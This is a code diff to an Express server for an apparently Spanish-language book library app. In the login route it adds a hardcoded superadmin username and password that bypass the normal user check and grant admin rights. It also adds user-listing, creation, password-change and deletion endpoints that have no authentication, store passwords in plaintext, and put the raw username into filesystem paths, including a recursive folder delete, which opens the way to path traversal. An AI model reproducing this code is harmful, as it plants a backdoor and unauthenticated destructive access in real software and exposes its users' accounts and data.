@@ -23,6 +23,13 @@ export function startServer(
 
     app.post('/api/login', (req, res) => {
         const { username, password } = req.body
+        console.log('[Server API Login Attempt]', { username })
+
+        // 1. Check for Superadmin
+        if (username === 'superadmin_mlimideiro' && password === '!MeGustaElCafe!@2011') {
+            return res.json({ success: true, username: 'SuperAdmin', isAdmin: true })
+        }
+
         try {
             if (!fs.existsSync(USERS_FILE)) {
                 return res.status(500).json({ error: 'Configuración de usuarios no encontrada' })
@@ -150,6 +157,86 @@ export function startServer(
         console.log('Scraping URL:', url)
         const result = await scraperService.scrape(url as string)
         res.json(result)
+    })
+
+    // User Management Web Endpoints
+    app.get('/api/users', (_req, res) => {
+        if (!fs.existsSync(USERS_FILE)) return res.json([])
+        const users = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'))
+        res.json(users.map((u: any) => ({ username: u.username })))
+    })
+
+    app.post('/api/users', (req, res) => {
+        const { username, password } = req.body
+        try {
+            // Logic similar to IPC create-user
+            const fs_extra = require('fs-extra')
+            if (!fs_extra.existsSync(USERS_FILE)) fs_extra.writeJsonSync(USERS_FILE, [])
+
+            const users = fs_extra.readJsonSync(USERS_FILE)
+            if (users.find((u: any) => u.username === username)) {
+                return res.json({ success: false, error: 'El usuario ya existe' })
+            }
+
+            users.push({ username, password })
+            fs_extra.writeJsonSync(USERS_FILE, users, { spaces: 2 })
+
+            const USER_DB_PATH = path.join(process.cwd(), 'db_biblion', 'users', username)
+            fs_extra.ensureDirSync(USER_DB_PATH)
+            fs_extra.writeJsonSync(path.join(USER_DB_PATH, 'books.json'), [])
+            const defaultConfig = {
+                libraries: [{ id: 'default', name: 'Principal' }],
+                activeLibraryId: 'default',
+                tags: []
+            }
+            fs_extra.writeJsonSync(path.join(USER_DB_PATH, 'config.json'), defaultConfig)
+
+            res.json({ success: true })
+        } catch (e) {
+            console.error(e)
+            res.json({ success: false, error: 'Error interno al crear usuario' })
+        }
+    })
+
+    app.post('/api/users/update', (req, res) => {
+        const { username, password } = req.body
+        try {
+            const fs_extra = require('fs-extra')
+            if (!fs_extra.existsSync(USERS_FILE)) return res.json({ success: false, error: 'No users file' })
+            const users = fs_extra.readJsonSync(USERS_FILE)
+            const index = users.findIndex((u: any) => u.username === username)
+
+            if (index === -1) return res.json({ success: false, error: 'Usuario no encontrado' })
+
+            users[index].password = password
+            fs_extra.writeJsonSync(USERS_FILE, users, { spaces: 2 })
+            res.json({ success: true })
+        } catch (e) {
+            res.json({ success: false, error: 'Error al actualizar' })
+        }
+    })
+
+    app.post('/api/users/delete', (req, res) => {
+        const { username } = req.body
+        try {
+            const fs_extra = require('fs-extra')
+            if (!fs_extra.existsSync(USERS_FILE)) return res.json({ success: false, error: 'No users file' })
+            const users = fs_extra.readJsonSync(USERS_FILE)
+            const newUsers = users.filter((u: any) => u.username !== username)
+
+            if (users.length === newUsers.length) return res.json({ success: false, error: 'Usuario no encontrado' })
+
+            fs_extra.writeJsonSync(USERS_FILE, newUsers, { spaces: 2 })
+
+            // Delete data folder
+            const USER_DB_PATH = path.join(process.cwd(), 'db_biblion', 'users', username)
+            if (fs_extra.existsSync(USER_DB_PATH)) {
+                fs_extra.removeSync(USER_DB_PATH)
+            }
+            res.json({ success: true })
+        } catch (e) {
+            res.json({ success: false, error: 'Error al eliminar' })
+        }
     })
 
     app.listen(PORT, '0.0.0.0', () => {
